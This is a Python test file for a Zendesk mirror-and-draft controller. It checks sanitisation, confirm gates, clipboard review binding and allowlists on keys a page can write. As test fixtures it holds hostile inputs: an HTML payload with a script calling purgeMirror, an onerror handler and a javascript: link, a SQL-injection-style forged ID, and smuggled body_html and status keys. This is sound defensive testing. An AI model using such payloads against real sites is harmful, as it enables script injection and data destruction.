"""ZendeskWebController + ZendeskBridge contract tests (no WebEngine).

Load-bearing invariants locked here:

* every ``body_srcdoc`` leaving the controller has passed sanitize_html;
* the full destructive-gate set on delete_revision / purge_mirror
  (approve-once, cancel-never, forged/stale/malformed silent, fail closed
  without a confirm fn, confirm-raises means NO, store-raises resolves
  un-dispatched, single-winner reentrancy, post-approve count recompute);
* the claim-before-nested-event-loop rule for the import pickers and the
  mutation freeze while either claim is held;
* copy-exact reads DB bytes with target-kind disambiguation, the
  pending-draft clipboard refusal, and the body_rich mime-laundering guard
  (drafts included — draft rich copies pass sanitize_html too);
* js_save_draft is RENAME-ONLY (article {title}; macro {name, description})
  and the review diff is computed over the clipboard projection
  (html_to_review_text(body_html) when set), so reviewed == copied always;
* THE CLIPBOARD INVARIANT — whatever reaches the clipboard is
  byte-identical to something the reviewer was shown, and nothing can be
  present in the copied bytes without being present in the reviewed
  material. Locked here as: the authoritative review is a SOURCE diff of
  the exact bytes (readable projection served only as a labelled SECONDARY
  view); the clipboard gate hash-binds every released string (plain AND
  text/html mime flavour) to a recorded review, for DRAFTS and MIRROR rows
  alike, on top of a recompute-from-row content hash; verbatim pull bytes
  are announced, never hidden; a zero-change source diff over differing
  bytes is a surfaced warning; and every content mutation (including an
  out-of-band one) drops the record. The six confirmed exploit variants
  each have a dedicated end-to-end regression below;
* THE UNIVERSAL DRAFT-COPY CONFIRM — every clipboard release of DRAFT
  content (article draft or macro draft, every field, both mime flavours)
  takes a NATIVE confirm that DISPLAYS THE EXACT BYTES; absent, declined,
  or bytes that moved under the dialog ⇒ no clipboard write and no
  copy_resolved receipt. MIRROR rows keep the review-record gate alone.
  This REPLACED a provenance ledger that tried to gate only page-authored
  bytes; E1 (a partial macro write losing the stamp) and E2 (authorship
  laundering — the page drives Renn through the co-registered chat bridge)
  both have regressions below, as does the ledger's absence;
* the PREVIEW sanitize profile is additive and rendering-only: the preview
  keeps presentational markup so pulled articles render faithfully and the
  markup notice stays rare, while the clipboard and stored content keep the
  strict profile;
* js_save_body_edit is the ONE content-bearing slot: only the markdown
  ``body`` payload key is honored, body_html is ALWAYS recomputed
  Python-side as sanitize_html(markdown_to_html(body)) (smuggled
  body_html/html/rich keys change nothing beyond the recomputed values),
  mirror article rows stay byte-identical, and only pending drafts accept
  edits;
* search results are served from the FTS hit ids — authoritative and
  complete for the query, never intersected with the 500-row browse slice;
* the compat surface exists and article_push / macro_push / sync_requested
  are NEVER emitted (the structural no-Zendesk-write guarantee);
* the bridge is a pure relay.

Parity note: the controller reads the mirror through the same store
functions page.py feeds the native tab from, so no SQL is duplicated from
src/ui; the only duplicated presentation constant is the "Mon D, YYYY"
date-display format, locked by the viewmodel assertions below.
"""

import json
import os
import re
from pathlib import Path

import pytest
from PySide6.QtWidgets import QApplication

import src.services.zendesk_web as zendesk_web
from src.data import zendesk_store
from src.data.html_sanitize import sanitize_html
from src.services.zendesk_web import ZendeskWebController
from src.ui.web.zendesk_bridge import ZendeskBridge

REPO = Path(__file__).resolve().parent.parent


@pytest.fixture(scope="module", autouse=True)
def _qt_app():
    # A full (offscreen) QApplication, not QCoreApplication: a bare
    # QCoreApplication created here poisons any GUI test file that runs
    # later in the same process (`QApplication.instance()` returns the
    # non-GUI app -> native crash on widget construction).
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    app = QApplication.instance() or QApplication([])
    yield app


@pytest.fixture(autouse=True)
def _no_environment_probes(monkeypatch):
    # keep tests hermetic: no keyring/settings reads from the dev box
    monkeypatch.setattr(zendesk_web, "_probe_connected", lambda: False)
    monkeypatch.setattr(zendesk_web, "_last_pull_iso", lambda: None)


HOSTILE_HTML = ('<h2>ok</h2><script>window.zendeskBridge.purgeMirror("all")'
                '</script><img src=x onerror="alert(1)">'
                '<a href="javascript:alert(1)">x</a>')


def _seed_mirror(conn):
    zendesk_store.upsert_categories(conn, [
        {"id": 1, "name": "General", "position": 1}])
    zendesk_store.upsert_sections(conn, [
        {"id": 9, "category_id": 1, "name": "FAQ", "position": 1}])
    zendesk_store.upsert_articles(conn, [
        {"id": 101, "title": "Setting up SSO",
         "body_html": "<h2>Steps</h2><p>Log into the admin console.</p>",
         "section_id": 9, "label_names": ["sso"], "author_name": "Ana",
         "updated_at": "2026-07-01T10:00:00Z"},
        {"id": 102, "title": "Password reset",
         "body_html": "<p>Use the reset link.</p>", "section_id": 9,
         "updated_at": "2026-06-12T08:00:00Z"},
    ])
    zendesk_store.upsert_macros(conn, [
        {"id": 201, "name": "Refund apology", "description": "sorry note",
         "active": True, "updated_at": "2026-06-12T08:00:00Z",
         "actions": [{"field": "comment_value", "value": "Hi there"}]},
        {"id": 202, "name": "HTML reply", "active": True,
         "updated_at": "2026-06-13T08:00:00Z",
         "actions": [{"field": "comment_value_html",
                      "value": "<p>Hello rich</p>"}]},
    ])


def _controller(db, **kw):
    conn = db.conn
    kw.setdefault("conn_fn", lambda: conn)
    ctrl = ZendeskWebController(**kw)
    seen = {"data": [], "article": [], "macro": [], "revisions": [],
            "diffs": [], "imports": [], "pulls": [], "copies": [],
            "actions": [], "status": [], "pushes": []}
    ctrl.zendesk_data.connect(lambda j: seen["data"].append(json.loads(j)))
    ctrl.article_detail.connect(lambda j: seen["article"].append(json.loads(j)))
    ctrl.macro_detail.connect(lambda j: seen["macro"].append(json.loads(j)))
    ctrl.revisions_data.connect(lambda j: seen["revisions"].append(json.loads(j)))
    ctrl.diff_ready.connect(lambda j: seen["diffs"].append(json.loads(j)))
    ctrl.import_resolved.connect(lambda j: seen["imports"].append(json.loads(j)))
    ctrl.pull_resolved.connect(lambda j: seen["pulls"].append(json.loads(j)))
    ctrl.copy_resolved.connect(lambda j: seen["copies"].append(json.loads(j)))
    ctrl.action_resolved.connect(lambda j: seen["actions"].append(json.loads(j)))
    ctrl.status_text.connect(lambda t: seen["status"].append(t))
    # the never-emitted compat signals — any emission is a test failure
    ctrl.sync_requested.connect(lambda: seen["pushes"].append("sync"))
    ctrl.article_push.connect(lambda i: seen["pushes"].append(("apush", i)))
    ctrl.macro_push.connect(lambda i: seen["pushes"].append(("mpush", i)))
    return ctrl, seen


def _serve_revisions(ctrl, filt="all"):
    ctrl.js_request_revisions(filt)


def _review(ctrl, kind, did):
    """Do what a specialist does before copying a DRAFT: open the source
    diff. Serving it is what records the review the clipboard gate checks."""
    ctrl.js_request_diff(kind, str(did))


def _review_article(ctrl, aid):
    """Mirror rows have the same gate: opening the article is what serves
    the exact source bytes (body_source) and records the review."""
    ctrl.js_open_article(str(aid))


def _review_macro(ctrl, mid):
    ctrl.js_open_macro(str(mid))


def _gated(db, *, answer=True, **kw):
    """A controller behind a fake NATIVE confirm, page.py-shaped: the real
    _web_zendesk_confirm takes an optional third `detail` argument (the
    scrollable QMessageBox detail pane the copy gate puts the exact
    clipboard bytes in), so the fake must too.

    Every DRAFT copy goes through this dialog, so draft-copy tests build
    their controller here rather than with the bare `_controller`."""
    confirms = []
    def confirm(title, text, detail=None):
        confirms.append((title, text, detail))
        if callable(answer):
            return answer()
        return answer
    ctrl, seen = _controller(db, confirm_fn=confirm, **kw)
    return ctrl, seen, confirms


def _confirm_blob(confirms):
    """Everything the native confirm actually PUT IN FRONT OF THE OPERATOR —
    title + message + detail pane. The copy gate's contract is that the exact
    clipboard bytes are in here."""
    return "\n".join(str(part) for call in confirms for part in call)


# ── viewmodel shapes ─────────────────────────────────────────────────

def test_zendesk_data_shape(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()
    vm = seen["data"][-1]
    assert vm["view"] == "articles" and vm["connected"] is False
    assert vm["demo"] is False
    assert vm["counts"] == {"articles": 2, "macros": 2, "revisions_open": 0}
    assert vm["last_pull_display"] == "Never"
    cat = vm["categories"][0]
    assert cat["name"] == "General"
    assert cat["sections"] == [{"id": 9, "name": "FAQ", "article_count": 2}]
    art = next(a for a in vm["articles"] if a["id"] == 101)
    assert art["title"] == "Setting up SSO" and art["section"] == "FAQ"
    assert art["author"] == "Ana" and art["labels"] == ["sso"]
    assert art["updated_display"] == "Jul 1, 2026"
    assert art["draft"] is False and art["outdated"] is False
    assert art["origin"] == "pull" and art["open_revisions"] == 0
    mac = next(m for m in vm["macros"] if m["id"] == 201)
    assert mac["name"] == "Refund apology" and mac["active"] is True
    assert mac["updated_display"] == "Jun 12, 2026"


def test_zendesk_data_without_conn_degrades_empty():
    ctrl = ZendeskWebController(demo=True)
    got = []
    ctrl.zendesk_data.connect(lambda j: got.append(json.loads(j)))
    ctrl.js_refresh()
    vm = got[-1]
    assert vm["articles"] == [] and vm["macros"] == [] and vm["demo"] is True


def test_open_revisions_counted_per_row(empty_db):
    _seed_mirror(empty_db.conn)
    zendesk_store.save_article_draft(
        empty_db.conn, title="SSO rev", body="new", article_id=101,
        rationale="stale steps")
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()
    vm = seen["data"][-1]
    assert vm["counts"]["revisions_open"] == 1
    art = next(a for a in vm["articles"] if a["id"] == 101)
    assert art["open_revisions"] == 1


def test_article_detail_srcdoc_is_sanitized(empty_db):
    _seed_mirror(empty_db.conn)
    zendesk_store.upsert_articles(empty_db.conn, [
        {"id": 103, "title": "Evil", "body_html": HOSTILE_HTML,
         "section_id": 9, "updated_at": "2026-07-02T00:00:00Z"}])
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_article("103")
    detail = seen["article"][-1]
    doc = detail["body_srcdoc"].lower()
    assert "<script" not in doc and "onerror" not in doc
    assert "javascript:" not in doc
    assert "<h2>ok</h2>" in detail["body_srcdoc"]
    # shape of the detail viewmodel
    assert detail["section"] == "FAQ" and detail["category"] == "General"
    assert detail["origin"] == "pull" and detail["revisions"] == []


def test_article_detail_lists_revisions(empty_db):
    _seed_mirror(empty_db.conn)
    did = zendesk_store.save_article_draft(
        empty_db.conn, title="SSO (rev)", body="x", article_id=101,
        rationale="r")
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_article("101")
    revs = seen["article"][-1]["revisions"]
    assert revs == [{"draft_id": did, "status": "pending",
                     "title": "SSO (rev)", "source_ref": None,
                     "updated_display": revs[0]["updated_display"]}]


def test_macro_detail_shape_and_action_display(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_macro("202")
    detail = seen["macro"][-1]
    assert detail["name"] == "HTML reply" and detail["active"] is True
    assert detail["actions"] == [{"field": "comment_value_html",
                                  "display": "Comment/Reply (HTML)",
                                  "value": "<p>Hello rich</p>"}]


def test_macro_action_labels_match_zendesk_wording(empty_db):
    """Action-row labels follow Zendesk Admin wording (ui dossier): object
    names for id-suffixed fields, sentence case for multi-word fields —
    matching the demo fixture ('Group', 'Add tags', 'Comment mode'), never
    title-cased field names ('Group Id', 'Add Tags')."""
    _seed_mirror(empty_db.conn)
    zendesk_store.upsert_macros(empty_db.conn, [
        {"id": 210, "name": "Escalate", "active": True,
         "updated_at": "2026-07-01T00:00:00Z",
         "actions": [{"field": "status", "value": "Open"},
                     {"field": "priority", "value": "High"},
                     {"field": "type", "value": "Incident"},
                     {"field": "subject", "value": "Escalated"},
                     {"field": "group_id", "value": "Billing"},
                     {"field": "assignee_id", "value": "Ana"},
                     {"field": "ticket_form_id", "value": "Default"},
                     {"field": "brand_id", "value": "Alma"},
                     {"field": "set_tags", "value": "vip"},
                     {"field": "add_tags", "value": "billing"},
                     {"field": "remove_tags", "value": "stale"},
                     {"field": "comment_mode", "value": "Private"},
                     {"field": "comment_value", "value": "Hi"},
                     {"field": "side_conversation", "value": "x"}]}])
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_macro("210")
    displays = [a["display"] for a in seen["macro"][-1]["actions"]]
    assert displays == ["Status", "Priority", "Type", "Subject", "Group",
                        "Assignee", "Form", "Brand", "Set tags", "Add tags",
                        "Remove tags", "Comment mode", "Comment/Reply",
                        # unknown fields: sentence case, never Title Case
                        "Side conversation"]


def test_open_article_forged_ids_silent(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)
    for forged in ("", None, "abc", "9999", "101; DROP TABLE", "1e3", "1.5"):
        ctrl.js_open_article(forged)
        ctrl.js_open_macro(forged)
    assert seen["article"] == [] and seen["macro"] == []


def test_set_view_and_search(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)
    ctrl.js_set_view("macros")
    assert seen["data"][-1]["view"] == "macros"
    ctrl.js_set_view("evil")                       # allowlist → silent
    assert len(seen["data"]) == 1
    ctrl.js_search("sso", "articles")
    vm = seen["data"][-1]
    assert vm["query"] == "sso"
    assert [a["id"] for a in vm["articles"]] == [101]
    assert len(vm["macros"]) == 2                  # macros untouched by kind
    ctrl.js_search("sso", "bogus-kind")            # kind allowlist → silent
    assert len(seen["data"]) == 2
    ctrl.js_search("", "all")                      # empty → full re-serve
    assert "query" not in seen["data"][-1]


def test_search_serves_hits_outside_browse_slice(empty_db):
    """C5 regression: served search results are AUTHORITATIVE AND COMPLETE
    for the query — a hit whose row is outside the 500 most-recently-updated
    browse slice must still be served (rows come from the FTS hit ids, not
    an intersection with the capped browse lists)."""
    conn = empty_db.conn
    zendesk_store.upsert_sections(conn, [{"id": 9, "name": "FAQ"}])
    # the target is the OLDEST article, pushed out of the 500-row slice
    zendesk_store.upsert_articles(conn, [
        {"id": 1, "title": "Ancient xylophone guide",
         "body_html": "<p>tuning a xylophone</p>", "section_id": 9,
         "label_names": ["music"], "author_name": "Ana",
         "updated_at": "2020-01-01T00:00:00Z"}])
    zendesk_store.upsert_articles(conn, [
        {"id": 1000 + i, "title": f"Filler {i}", "body_html": "<p>x</p>",
         "section_id": 9, "updated_at": f"2026-07-{(i % 28) + 1:02d}T00:00:00Z"}
        for i in range(500)])
    zendesk_store.upsert_macros(conn, [
        {"id": 1, "name": "Ancient macro", "description": "xylophone routing",
         "active": True, "updated_at": "2020-01-01T00:00:00Z",
         "actions": [{"field": "comment_value", "value": "old reply"}]}])
    zendesk_store.upsert_macros(conn, [
        {"id": 1000 + i, "name": f"Macro {i}", "active": True,
         "updated_at": f"2026-07-{(i % 28) + 1:02d}T00:00:00Z",
         "actions": [{"field": "comment_value", "value": "hi"}]}
        for i in range(500)])
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()
    browse = seen["data"][-1]
    assert 1 not in {a["id"] for a in browse["articles"]}  # outside the slice
    assert 1 not in {m["id"] for m in browse["macros"]}
    ctrl.js_search("xylophone", "all")
    vm = seen["data"][-1]
    assert vm["query"] == "xylophone"                      # additive echo key
    assert [a["id"] for a in vm["articles"]] == [1]
    assert [m["id"] for m in vm["macros"]] == [1]
    # search rows carry the FULL browse row shape (no second dialect)
    art = vm["articles"][0]
    assert art["title"] == "Ancient xylophone guide"
    assert art["section"] == "FAQ" and art["author"] == "Ana"
    assert art["labels"] == ["music"] and art["origin"] == "pull"
    assert art["updated_display"] == "Jan 1, 2020"
    assert art["open_revisions"] == 0
    mac = vm["macros"][0]
    assert mac["name"] == "Ancient macro" and mac["active"] is True
    assert mac["description"] == "xylophone routing"
    assert mac["open_revisions"] == 0
    # served-by-search rows are addressable (detail opens work)
    ctrl.js_open_article("1")
    assert seen["article"][-1]["id"] == 1


def test_revisions_data_filters_and_shape(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    d1 = zendesk_store.save_article_draft(
        conn, title="SSO (rev)", body="new body", article_id=101,
        rationale="Steps 3-5 were stale.",
        sources_json=[{"ref": "doc:abc", "label": "SSO runbook"}])
    d2 = zendesk_store.save_macro_draft(
        conn, name="Refund v2", actions=[{"field": "comment_value",
                                          "value": "hello"}], macro_id=201)
    zendesk_store.set_draft_status(conn, "macro", d2, "copied")
    ctrl, seen = _controller(empty_db)
    ctrl.js_request_revisions("open")
    vm = seen["revisions"][-1]
    assert vm["filter"] == "open"
    assert [r["draft_id"] for r in vm["revisions"]] == [d1]
    row = vm["revisions"][0]
    assert row["kind"] == "article" and row["target_id"] == 101
    assert row["target_title"] == "Setting up SSO"
    assert row["rationale"] == "Steps 3-5 were stale."
    assert row["sources"] == [{"ref": "doc:abc", "label": "SSO runbook"}]
    assert row["is_new"] is False and row["copied_display"] is None
    ctrl.js_request_revisions("copied")
    assert [r["draft_id"] for r in seen["revisions"][-1]["revisions"]] == [d2]
    assert seen["revisions"][-1]["revisions"][0]["copied_display"]
    ctrl.js_request_revisions("all")
    assert len(seen["revisions"][-1]["revisions"]) == 2
    ctrl.js_request_revisions("evil")              # allowlist → silent
    assert len(seen["revisions"]) == 3


def test_diff_ready_workbench_row_shape(empty_db):
    _seed_mirror(empty_db.conn)
    did = zendesk_store.save_article_draft(
        empty_db.conn, title="Setting up SSO (SAML)",
        body="Steps\nLog into the access console.", article_id=101,
        rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    assert diff["kind"] == "article" and diff["draft_id"] == did
    assert diff["baseline_present"] is True and diff["change_count"] > 0
    assert diff["title"] == {"changed": True, "old": "Setting up SSO",
                             "new": "Setting up SSO (SAML)"}
    tags = {r["tag"] for r in diff["rows"]}
    assert tags <= {"add", "del", "equal"}
    changed = [r for r in diff["rows"] if r["tag"] in ("add", "del")]
    assert changed and all("spans" in r for r in changed)
    for row in changed:
        assert "".join(s["text"] for s in row["spans"]) == row["text"]


def test_diff_unlinked_draft_has_no_baseline(empty_db):
    _seed_mirror(empty_db.conn)
    did = zendesk_store.save_article_draft(
        empty_db.conn, title="Brand new", body="fresh", rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    assert seen["diffs"][-1]["baseline_present"] is False
    ctrl.js_request_diff("article", "424242")      # never served → silent
    ctrl.js_request_diff("bogus", str(did))
    assert len(seen["diffs"]) == 1


# ── save + mark lifecycle ────────────────────────────────────────────

def test_save_draft_payload_key_allowlist(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="Old", body="old body", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_save_draft("article", str(did), json.dumps({
        "title": "New title",
        # rename-only surface: draft CONTENT is not page-writable
        "body": "new body", "body_html": "<p>injected</p>",
        # a page script riding a transition / provenance rewrite:
        "status": "copied", "copied_at": "2026-01-01", "rationale": "forged",
        "sources_json": "[]"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["title"] == "New title"
    assert d["body"] == "old body"                 # content keys ignored
    assert d["body_html"] is None
    assert d["status"] == "pending"                # ignored keys stayed put
    assert d["copied_at"] is None
    assert d["rationale"] == "r"


def test_save_draft_refused_on_copied_and_forged(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    zendesk_store.set_draft_status(conn, "article", did, "copied")
    ctrl.js_save_draft("article", str(did), json.dumps({"title": "X"}))
    assert zendesk_store.get_article_draft(conn, did)["title"] == "T"
    # forged id / malformed payload → silent
    ctrl.js_save_draft("article", "999", json.dumps({"title": "X"}))
    ctrl.js_save_draft("article", str(did), "{not json")


def test_save_macro_rename_only_allowlist(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_macro_draft(
        conn, name="M", description="old desc", macro_id=202, rationale="r",
        actions=[{"field": "set_tags", "value": "vip"},
                 {"field": "comment_value_html", "value": "<p>old</p>"}])
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_save_draft("macro", str(did), json.dumps({
        "name": "M2", "description": "new desc",
        # macro CONTENT is not page-writable (rename-only surface)
        "reply": "injected reply",
        "actions": [{"field": "comment_value", "value": "evil"}]}))
    d = zendesk_store.get_macro_draft(conn, did)
    assert d["name"] == "M2"
    assert d["description"] == "new desc"
    assert d["actions"] == [{"field": "set_tags", "value": "vip"},
                            {"field": "comment_value_html",
                             "value": "<p>old</p>"}]   # untouched
    # description-only rename works too (no name key required)
    ctrl.js_save_draft("macro", str(did),
                       json.dumps({"description": "third"}))
    assert zendesk_store.get_macro_draft(conn, did)["description"] == "third"
    # no allowlisted key at all → silent no-op
    ctrl.js_save_draft("macro", str(did),
                       json.dumps({"reply": "still evil"}))
    assert zendesk_store.get_macro_draft(conn, did)["name"] == "M2"


def test_save_draft_body_html_not_writable_even_when_ready(empty_db):
    """C1/C4 regression: the exact attack chain — a page script writing
    body_html on a (ready) Renn draft so the clipboard would deliver bytes
    the reviewer's diff never showed. The write must be refused."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="clean markdown", article_id=101,
        body_html="<p>clean markdown</p>", rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_save_draft("article", str(did), json.dumps(
        {"body_html": "<p>EVIL</p><script>x()</script>"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body_html"] == "<p>clean markdown</p>"
    assert d["body"] == "clean markdown"
    # body_html-only payload carries no allowlisted key → total no-op
    ctrl.js_save_draft("article", str(did), json.dumps({"body": "EVIL md"}))
    assert zendesk_store.get_article_draft(conn, did)["body"] == "clean markdown"


def test_diff_reviews_what_the_clipboard_delivers(empty_db):
    """C1 belt regression: when a draft carries body_html, the review diff
    is computed over html_to_text(body_html) — the projection of the bytes
    _resolve_copy will put on the clipboard — never over a divergent
    markdown body (reviewed == copied, always)."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="Setting up SSO", body="innocent markdown body",
        article_id=101, body_html="<p>DIVERGENT clipboard payload</p>",
        rationale="r")
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    added = " ".join(r["text"] for r in seen["diffs"][-1]["rows"]
                     if r["tag"] == "add")
    assert "DIVERGENT" in added                     # diff shows clipboard text
    assert "innocent" not in added                  # not the stale markdown
    # and the clipboard indeed delivers the body_html the diff reviewed
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1][0] == "<p>DIVERGENT clipboard payload</p>"


def test_diff_falls_back_to_markdown_body_without_body_html(empty_db):
    _seed_mirror(empty_db.conn)
    did = zendesk_store.save_article_draft(
        empty_db.conn, title="T", body="markdown only", article_id=101,
        rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    added = " ".join(r["text"] for r in seen["diffs"][-1]["rows"]
                     if r["tag"] == "add")
    assert "markdown only" in added


def test_mark_ready_and_copied_db_state_validation(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_mark_copied("article", str(did))       # pending → copied allowed
    assert zendesk_store.get_article_draft(conn, did)["status"] == "copied"
    assert zendesk_store.get_article_draft(conn, did)["copied_at"]
    # copied is immutable — mark_ready silently refuses
    ctrl.js_mark_ready("article", str(did))
    assert zendesk_store.get_article_draft(conn, did)["status"] == "copied"
    d2 = zendesk_store.save_macro_draft(
        conn, name="M", actions=[], macro_id=201, rationale="r")
    _serve_revisions(ctrl)
    ctrl.js_mark_ready("macro", str(d2))
    assert zendesk_store.get_macro_draft(conn, d2)["status"] == "ready"
    # unserved/forged ids never reach the store
    ctrl.js_mark_ready("macro", "31337")
    ctrl.js_mark_copied("bogus-kind", str(d2))


# ── specialist body edits (js_save_body_edit; articles only, v1) ─────
#
# The one content-bearing slot. Safe ONLY because of the recompute
# invariant (closes review finding C1's class): the payload's markdown
# `body` key is the single honored input and body_html is ALWAYS
# recomputed Python-side as sanitize_html(markdown_to_html(body)) — so the
# reviewed diff, the stored body_html, and the clipboard copy can never
# diverge, and mirror article rows are never touched.

def _rendered(body):
    from src.data.html_markdown import markdown_to_html
    from src.data.html_sanitize import sanitize_html
    return sanitize_html(markdown_to_html(body))


def test_body_edit_pending_draft_updates_and_recomputes(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="old", article_id=101,
        body_html="<p>old</p>", rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_save_body_edit("draft", str(did), json.dumps(
        {"body": "New **bold** steps"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body"] == "New **bold** steps"
    assert d["body_html"] == _rendered("New **bold** steps")
    assert "<strong>bold</strong>" in d["body_html"]
    res = seen["actions"][-1]
    assert res["action"] == "body_edit" and res["ok"] is True
    assert res["kind"] == "article" and res["draft_id"] == did
    assert res["target"] == "draft" and res["error"] is None
    # revisions re-pushed (last filter) with the additive source_ref key
    row = next(r for r in seen["revisions"][-1]["revisions"]
               if r["draft_id"] == did)
    assert "source_ref" in row and row["source_ref"] is None
    # no article detail is open → no detail re-push
    assert seen["article"] == []


def test_body_edit_smuggled_html_keys_change_nothing_beyond_recompute(empty_db):
    """C1-class regression: a payload smuggling body_html/html/rich (or
    status/provenance) keys changes NOTHING beyond the recomputed values —
    the page can never supply HTML, and a hostile markdown body cannot
    land live markup because the recompute passes sanitize_html."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="old", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    hostile_md = ("Fine paragraph.\n\n<script>evil()</script>"
                  '<img src=x onerror="alert(1)">')
    ctrl.js_save_body_edit("draft", str(did), json.dumps({
        "body": hostile_md,
        "body_html": "<p>SMUGGLED</p><script>x()</script>",
        "html": "<p>SMUGGLED2</p>", "rich": "<b>SMUGGLED3</b>",
        "status": "copied", "title": "forged", "rationale": "forged",
        "sources_json": "[]"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body"] == hostile_md
    assert d["body_html"] == _rendered(hostile_md)     # recomputed, only
    assert "SMUGGLED" not in d["body_html"]
    assert "<script" not in d["body_html"].lower()
    assert "onerror" not in d["body_html"].lower()
    assert d["status"] == "pending" and d["title"] == "T"
    assert d["rationale"] == "r"
    assert seen["actions"][-1]["ok"] is True


def test_body_edit_diff_reflects_clipboard_projection(empty_db):
    """After an edit, the reviewed diff and the clipboard bytes both come
    from the recomputed body_html — reviewed == copied, always.

    The copy also crosses the universal draft-copy confirm — approved here;
    the refusal branches live in the draft-copy section below."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="Setting up SSO", body="stale", article_id=101,
        body_html="<p>stale</p>", rationale="r")
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl)
    ctrl.js_save_body_edit("draft", str(did), json.dumps(
        {"body": "Completely fresh wording here"}))
    ctrl.js_request_diff("article", str(did))
    added = " ".join(r["text"] for r in seen["diffs"][-1]["rows"]
                     if r["tag"] == "add")
    assert "fresh wording" in added
    assert "stale" not in added
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
    assert calls[-1][0] == stored
    assert stored == _rendered("Completely fresh wording here")
    assert stored in _confirm_blob(confirms)


def test_body_edit_nonpending_draft_refused_with_status_text(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101,
        body_html="<p>B</p>", rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body"] == "B" and d["body_html"] == "<p>B</p>"
    assert seen["actions"] == []                       # silent no-op
    assert seen["status"] and "ready" in seen["status"][-1]
    zendesk_store.set_draft_status(conn, "article", did, "copied")
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body"] == "B" and d["body_html"] == "<p>B</p>"
    assert seen["actions"] == []
    assert "copied" in seen["status"][-1]


def test_body_edit_article_creates_specialist_draft_mirror_untouched(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_article("101")
    n_details = len(seen["article"])
    before = dict(conn.execute(
        "SELECT * FROM zendesk_articles WHERE article_id=101").fetchone())
    ctrl.js_save_body_edit("article", "101", json.dumps(
        {"body": "Edited body"}))
    after = dict(conn.execute(
        "SELECT * FROM zendesk_articles WHERE article_id=101").fetchone())
    assert after == before                 # mirror row byte-identical
    drafts = [dict(r) for r in conn.execute(
        "SELECT * FROM zendesk_article_drafts").fetchall()]
    assert len(drafts) == 1
    d = drafts[0]
    assert d["article_id"] == 101 and d["status"] == "pending"
    assert d["source_ref"] == "specialist-edit"
    assert d["rationale"] == "Edited in the workspace."
    assert d["title"] == "Setting up SSO"  # article title, per contract
    assert d["body"] == "Edited body"
    assert d["body_html"] == _rendered("Edited body")
    res = seen["actions"][-1]
    assert res["action"] == "body_edit" and res["ok"] is True
